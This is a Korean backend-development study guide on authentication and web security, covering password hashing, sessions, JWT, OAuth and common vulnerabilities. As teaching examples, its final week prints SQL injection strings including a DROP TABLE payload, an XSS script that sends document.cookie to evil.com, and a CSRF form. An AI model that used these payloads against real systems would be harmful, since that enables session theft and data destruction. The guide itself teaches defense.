# 07 - Stage 5: 인증과 보안 (4주)

> 허브: [00-백엔드 학습 허브](00-백엔드-학습-허브.md) · 이전: [06-Stage 4 — API 설계](06-stage4-API-설계.md)
> **가장 헷갈리는 스테이지.** 용어가 서로 겹치고, **인터넷 자료의 상당수가 낡았거나 틀렸다.**

## 이 스테이지의 질문

> **서버는 상대가 누구인지 어떻게 아는가? 그리고 그 앎을 어떻게 위조당하지 않는가?**

[03-Stage 1 — HTTP와 웹의 동작 원리](03-stage1-HTTP와-웹의-동작-원리.md)에서 "HTTP는 stateless라 기억하지 못한다"고 했다.
그래서 매 요청마다 신분을 다시 증명해야 한다. **그 증명 방식의 전부**가 이 스테이지다.

---

## 0. 먼저 용어부터 — 여기서 대부분 헤맨다

```
인증 (Authentication, AuthN)  "너 누구야?"       → 신원 확인
인가 (Authorization,  AuthZ)  "너 이거 해도 돼?"  → 권한 확인
```

**둘은 순서가 있고 완전히 다른 문제다.**
- 401 Unauthorized → 사실은 "인증 실패"다 (이름이 잘못 붙은 역사적 오류)
- 403 Forbidden → 이게 "인가 실패"다

그리고 서로 직교하는 축이 하나 더 있다:

```
[ 신원을 무엇으로 증명하나 ]    비밀번호 / OTP / 생체 / 소셜로그인
[ 그 증명을 어떻게 유지하나 ]    세션 / 토큰(JWT)      ← 여기가 제일 헷갈리는 곳
[ 그 증명을 어디에 담아 보내나 ]  쿠키 / Authorization 헤더
```

> **⚠️ 가장 흔한 오해**: "세션 vs JWT" 또는 "쿠키 vs JWT"를 양자택일로 이해하는 것.
> **쿠키는 운반 수단이고, JWT는 토큰 형식이다.** 층이 다르다.
> JWT를 쿠키에 담을 수도 있고, 세션 ID를 헤더에 담을 수도 있다. 자주 함께 쓰인다.

## 1주차 — 비밀번호와 신원 확인

### 비밀번호는 암호화하지 않는다 — 해싱한다

```
암호화(encryption)  = 되돌릴 수 있음 (키가 있으면 복호화)
해싱(hashing)       = 되돌릴 수 없음 (단방향)
```

**왜 되돌릴 수 없어야 하나**: DB가 유출돼도 비밀번호를 알 수 없어야 한다.
서버조차 사용자의 비밀번호를 몰라야 한다.
(그래서 "비밀번호 찾기"가 아니라 "재설정"인 것이다.)

### 그런데 SHA-256도 안 된다

```
SHA-256("password123") → 항상 같은 값
공격자: 흔한 비밀번호 10억 개를 미리 해싱해둔 표(레인보우 테이블)로 즉시 역추적
게다가 SHA-256은 너무 빠르다 → GPU로 초당 수십억 번 시도 가능
```

**비밀번호 전용 해시**를 쓴다:

| 알고리즘 | 특징 |
|---|---|
| **bcrypt** | 오래됐지만 여전히 안전. 가장 무난 |
| **scrypt** | 메모리도 많이 쓰게 해서 GPU 공격에 강함 |
| **Argon2id** | 현재 권장 표준. 시간·메모리·병렬성 조절 가능 |

세 가지 공통 특징:
1. **느리다** (의도적으로) — 정상 로그인 1번에 100ms는 괜찮지만, 10억 번 시도에는 치명적
2. **솔트(salt)** 자동 포함 — 사용자마다 다른 랜덤값을 섞어서 같은 비밀번호도 다른 해시가 됨
3. **비용 조절 가능** — 하드웨어가 빨라지면 비용을 올린다

```ts
import bcrypt from 'bcrypt';

// 가입
const hash = await bcrypt.hash(plainPassword, 12);   // 12 = 비용 계수
await db.insert(users).values({ email, passwordHash: hash });

// 로그인
const ok = await bcrypt.compare(plainPassword, user.passwordHash);
```

### 로그인 구현 시 실수하기 쉬운 것들

```ts
// ❌ 어느 쪽이 틀렸는지 알려줌 → 이메일 존재 여부가 유출된다 (계정 열거 공격)
if (!user) return err('존재하지 않는 이메일입니다');
if (!ok)   return err('비밀번호가 틀렸습니다');

// ✅ 같은 메시지
if (!user || !ok) return err('이메일 또는 비밀번호가 올바르지 않습니다');
```

| 실수 | 대책 |
|---|---|
| 계정 열거 가능 | 에러 메시지 통일 |
| 무제한 로그인 시도 | 레이트 리밋 + 계정 잠금 |
| 비밀번호를 로그에 남김 | 로깅 시 민감 필드 마스킹 (**매우 흔한 사고**) |
| 타이밍 차이로 정보 유출 | 사용자 없어도 더미 해시 비교를 수행 |

### 🔧 마이크로 실습 (40분)

- [ ] 같은 비밀번호를 bcrypt로 2번 해싱 → **결과가 다른 것 확인** (솔트 때문)
- [ ] 비용 계수를 4 → 12 → 14로 바꾸며 소요 시간 측정
- [ ] SHA-256으로 같은 걸 해싱 → 항상 같고 순식간인 것 확인
- [ ] 왜 SHA-256이 부적합한지 자기 말로 3줄

## 2주차 — 세션 기반 인증

### 가장 오래되고 가장 단순한 방식

```
1. 로그인 성공
2. 서버가 랜덤 세션 ID 생성 → 서버 저장소에 { sessionId → userId } 저장
3. Set-Cookie: sessionId=xxx; HttpOnly; Secure; SameSite=Lax
4. 이후 요청마다 브라우저가 쿠키를 자동으로 붙임
5. 서버가 sessionId로 저장소를 조회 → 누구인지 안다
```

**핵심 성질**: 쿠키에는 **아무 의미 없는 랜덤 문자열**만 들어간다.
진짜 정보는 전부 서버에 있다.

### 장단점

| 장점 | 단점 |
|---|---|
| **즉시 로그아웃 가능** (서버에서 지우면 끝) | 서버가 상태를 가진다 |
| 정보가 클라이언트에 안 나감 | 서버 여러 대면 세션 공유 필요 (→ Redis) |
| 권한 변경이 즉시 반영 | 매 요청마다 저장소 조회 |
| 쿠키 크기가 작음 | |

**"서버가 상태를 가진다"**는 [01-백엔드의 5가지 근본 전제](01-백엔드의-5가지-근본-전제.md) ①과 충돌하는 것처럼 보이지만,
**세션 저장소를 밖(Redis)에 두면 해소된다.** 앱 서버 자체는 여전히 stateless다.

### 쿠키 보안 속성 (Stage 1 복습 + 심화)

```http
Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

| 속성 | 막는 공격 | 안 걸면 |
|---|---|---|
| `HttpOnly` | XSS로 쿠키 탈취 | JS 한 줄로 세션을 훔칠 수 있다 |
| `Secure` | 평문 도청 | 공용 와이파이에서 세션이 샌다 |
| `SameSite=Lax/Strict` | CSRF | 다른 사이트가 사용자 권한으로 요청 가능 |

**`SameSite` 값 선택:**
- `Strict` — 외부 링크로 들어와도 쿠키 안 붙음. 안전하지만 UX가 나쁨
- `Lax` — 최상위 GET 이동에는 붙음. **대부분의 기본 선택**
- `None` — 항상 붙음. `Secure` 필수. 크로스 도메인 API에서만

### 🔧 마이크로 실습 (1시간) — 세션 로그인 30줄

```ts
const sessions = new Map<string, { userId: number; expiresAt: number }>();
// (실서비스라면 Redis. 학습용은 Map으로 충분 — 재시작하면 날아가는 게 오히려 교육적)

// 로그인
const sid = crypto.randomUUID();
sessions.set(sid, { userId: user.id, expiresAt: Date.now() + 3600_000 });
res.setHeader('Set-Cookie',
  `sid=${sid}; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600`);

// 인증 미들웨어
const sid = parseCookie(req.headers.cookie)?.sid;
const session = sid ? sessions.get(sid) : undefined;
if (!session || session.expiresAt < Date.now()) return res401();
req.userId = session.userId;
```

**확인할 것:**
- [ ] 브라우저 개발자도구 → Application → Cookies에서 실제 쿠키 확인
- [ ] `HttpOnly`를 빼고 콘솔에서 `document.cookie` → **읽히는 것 확인**
- [ ] 서버 재시작 → 로그아웃되는 것 확인 (**세션이 서버 상태라는 증거**)

세 번째 실험이 핵심이다. "서버가 상태를 가진다"가 무슨 뜻인지 몸으로 안다.

## 3주차 — 토큰 기반 인증 (JWT)

### JWT의 발상

```
세션의 불편: 매 요청마다 서버 저장소를 조회해야 한다.
             서버가 여러 대면 저장소를 공유해야 한다.

발상:        정보를 토큰 자체에 담고, 위조 못 하게 서명을 붙이자.
             → 서버는 저장소 조회 없이 서명만 검증하면 된다.
```

### 구조

```
eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiI0MiIsImV4cCI6MTc1MH0 . SflKxwRJSMeKKF2QT4
└──── 헤더 ────┘        └──────── 페이로드 ────────┘      └─── 서명 ───┘
   알고리즘              실제 데이터(누구인지, 만료시각)      위조 방지
```

**⚠️ 결정적 사실: 앞의 두 조각은 암호화가 아니라 Base64 인코딩이다**(정확히는 URL-safe 변형인 base64url).
누구나 디코딩해서 내용을 읽을 수 있다.

```
서명이 보장하는 것: "이 내용은 변조되지 않았다"
서명이 보장하지 않는 것: "이 내용은 비밀이다"
```

→ **JWT 페이로드에 비밀번호·주민번호·개인정보를 넣으면 안 된다.**
여기서 사고가 자주 난다.

### JWT의 진짜 단점

| 단점 | 설명 |
|---|---|
| **즉시 무효화가 어렵다** | 서명이 유효하면 서버는 받아들인다. 로그아웃해도 토큰은 살아 있다 |
| 권한 변경이 반영 안 됨 | 관리자 권한을 뺏어도 토큰 만료 전까지 유효 |
| 크기가 크다 | 매 요청에 실려 나간다 |
| 저장 위치가 곤란 | localStorage → XSS에 노출 / 쿠키 → CSRF 고려 필요 |

**"즉시 무효화 불가"를 해결하려고 블랙리스트를 서버에 두면?**
→ 매 요청마다 서버 조회. **세션과 똑같아진다.** JWT를 쓴 이유가 사라진다.

### 그래서 실무는 조합해서 쓴다

널리 권장되는 구성:

```
액세스 토큰   짧은 수명 (5~15분), JWT, 메모리에 보관
리프레시 토큰 긴 수명 (수일~수주), 서버에 저장, HttpOnly 쿠키로 전달

동작:
  API 호출은 액세스 토큰으로 (서버 조회 없음, 빠름)
  만료되면 리프레시 토큰으로 갱신 (이때만 서버 조회)
  로그아웃 = 리프레시 토큰을 서버에서 삭제 → 최대 15분 뒤 완전 차단
```

**이 구성의 의미**: "즉시 무효화"를 **"최대 15분 내 무효화"로 타협**하고,
그 대가로 대부분의 요청에서 저장소 조회를 없앤다. **트레이드오프를 명시적으로 산 것이다.**

### 언제 무엇을 쓰나

| 상황 | 권장 |
|---|---|
| 단일 웹 앱, 같은 도메인 | **세션 + 쿠키** (단순하고 안전) |
| 즉시 로그아웃이 중요 (금융·의료) | **세션** |
| 모바일 앱 / 서드파티 클라이언트 | 토큰 |
| 서버 여러 대, 마이크로서비스 | 액세스+리프레시 조합 |
| 소규모 개인 프로젝트 | **세션이면 충분하다** |

> **⚠️ 자료 함정**: "JWT가 세션보다 현대적/우월하다"고 쓴 글이 인터넷에 매우 많다.
> **사실이 아니다.** 주요 인증 프레임워크들(Auth.js, Better Auth, Supabase Auth 등)의
> 기본값이 오히려 **서버 세션**인 경우가 많다.
> JWT는 특정 문제(분산·서드파티)를 푸는 도구지, 상위 호환이 아니다.

### OAuth2 / OIDC — "구글로 로그인" (개념만)

```
문제: 우리 서비스가 사용자의 구글 비밀번호를 받으면 안 된다.
해결: 사용자가 구글에서 로그인하고, 구글이 우리에게 "이 사람 맞다"는 증명을 준다.
```

```
OAuth2  = 인가 프로토콜 ("이 앱이 네 구글 드라이브를 읽어도 되나?")
OIDC    = OAuth2 위에 인증을 얹은 것 ("이 사람이 누구인가")  ← 소셜 로그인은 이것
```

**교양 수준에서 알 것:**
- Authorization Code Flow가 표준 (Implicit Flow는 폐기됨)
- 우리 서버는 사용자 비밀번호를 절대 보지 않는다
- 직접 구현하지 않는다 — 검증된 라이브러리를 쓴다

### 🔧 마이크로 실습 (1시간)

- [ ] JWT를 발급하고 **jwt.io 등에서 디코딩** → 내용이 그대로 보이는 것 확인
- [ ] 페이로드를 손으로 고쳐서 요청 → 서명 검증 실패 확인
- [ ] 만료 시간(exp)을 10초로 두고 만료 동작 확인
- [ ] 자기 말로: "내 프로젝트에 세션과 JWT 중 무엇을 쓸 것이고 왜인가" 5줄

## 4주차 — 웹 취약점과 방어

### ① 인젝션 (SQL Injection)

```ts
// ❌ 문자열 조립 — 절대 금지
const q = `SELECT * FROM users WHERE email = '${email}'`;
// email = "' OR '1'='1" → 전체 조회
// email = "'; DROP TABLE users; --" → 테이블 삭제

// ✅ 파라미터 바인딩 — 값은 값으로만 취급된다
db.prepare('SELECT * FROM users WHERE email = ?').get(email);
```

> **원리**: 방어의 핵심은 "위험한 문자를 걸러내는 것"이 아니라
> **"코드와 데이터를 애초에 섞지 않는 것"**이다. 필터링은 항상 우회당한다.
> 이 사고는 XSS·명령어 인젝션 등에도 그대로 적용된다.

### ② XSS (Cross-Site Scripting)

```
공격: 게시글에 <script>fetch('evil.com?c='+document.cookie)</script> 를 남김
      다른 사용자가 그 글을 보면 그 사용자의 브라우저에서 스크립트가 실행됨
```

| 방어 | 설명 |
|---|---|
| 출력 이스케이프 | 저장할 때가 아니라 **출력할 때** HTML 이스케이프 |
| `HttpOnly` 쿠키 | 성공해도 세션은 못 훔침 |
| CSP 헤더 | 허용된 출처의 스크립트만 실행 |

**백엔드의 역할**: 데이터를 그대로 저장하고, **출력 맥락에 맞게 이스케이프**하도록 보장.
(저장 시점에 이스케이프하면 API로 쓸 때 깨진다.)

### ③ CSRF (Cross-Site Request Forgery)

```
공격: evil.com 에 <form action="bank.com/transfer" method="POST"> 를 심음
      로그인된 사용자가 방문하면 → 브라우저가 은행 쿠키를 자동으로 붙여 전송
```

| 방어 | 설명 |
|---|---|
| `SameSite=Lax/Strict` | **현재 가장 실용적인 1차 방어** |
| CSRF 토큰 | 폼마다 예측 불가능한 토큰 |
| `Authorization` 헤더 사용 | 헤더는 자동으로 안 붙는다 → 토큰 방식은 CSRF에 덜 취약 |

**XSS vs CSRF 정리:**
```
XSS  = 내 사이트에서 공격자 코드가 실행됨       (스크립트 주입)
CSRF = 남의 사이트가 내 사이트에 요청을 위조함  (권한 도용)
```

### ④ 그 외 반드시 알 것

| 항목 | 요점 |
|---|---|
| **접근 제어 실패** | 가장 흔한 취약점. "URL을 아는 사람만"은 방어가 아니다 |
| **IDOR** | `/orders/1234`에서 숫자만 바꿔 남의 주문을 봄 → **소유권 검사 필수** |
| **시크릿 하드코딩** | API 키를 코드에 넣고 git에 올림. 환경변수로 (Stage 6) |
| **의존성 취약점** | `npm audit`, 정기 업데이트 |
| **과도한 정보 노출** | 에러에 스택트레이스, 응답에 불필요한 필드 |

**IDOR은 특히 실수하기 쉽다:**
```ts
// ❌ 로그인은 확인했지만 소유권은 확인 안 함
const order = await db.orders.findById(req.params.id);
return order;      // 남의 주문도 보인다

// ✅
const order = await db.orders.findById(req.params.id);
if (order.userId !== req.userId) return res404();   // 403 아니고 404 (존재 은닉)
```

**인증했다고 인가가 끝난 게 아니다.** 이 문장이 이 주차의 핵심이다.

### 실무 보안 체크리스트

- [ ] 모든 입력은 스키마로 검증 (Stage 4)
- [ ] SQL은 항상 파라미터 바인딩
- [ ] 비밀번호는 bcrypt/argon2
- [ ] 쿠키는 `HttpOnly` + `Secure` + `SameSite`
- [ ] HTTPS 강제
- [ ] 시크릿은 환경변수, git에 절대 금지
- [ ] 로그에 비밀번호·토큰·개인정보 남기지 않기
- [ ] 인증 후 **소유권/권한**을 별도로 확인
- [ ] 에러 응답에 내부 정보 없음
- [ ] 레이트 리밋
- [ ] `npm audit` 정기 실행

## 이 스테이지의 함정

| 함정 | 교정 |
|---|---|
| 세션 vs JWT를 양자택일로 이해 | 층이 다르다. 조합해서 쓴다 |
| "JWT가 더 현대적" | 아니다. 문제가 다를 뿐. 소규모 프로젝트는 세션이 대개 낫다 |
| JWT 페이로드에 민감정보 | Base64일 뿐 암호화가 아니다 |
| 인증만 하고 인가를 잊음 | IDOR의 원인. 로그인 확인 ≠ 권한 확인 |
| 입력 필터링으로 인젝션 방어 | 필터링은 우회된다. 바인딩/이스케이프가 정답 |
| 보안을 직접 구현 | 암호·인증 프로토콜은 검증된 라이브러리를 쓴다 |
| 오래된 블로그 자료 | **이 영역은 낡은 자료가 특히 위험하다.** OWASP·MDN 우선 |
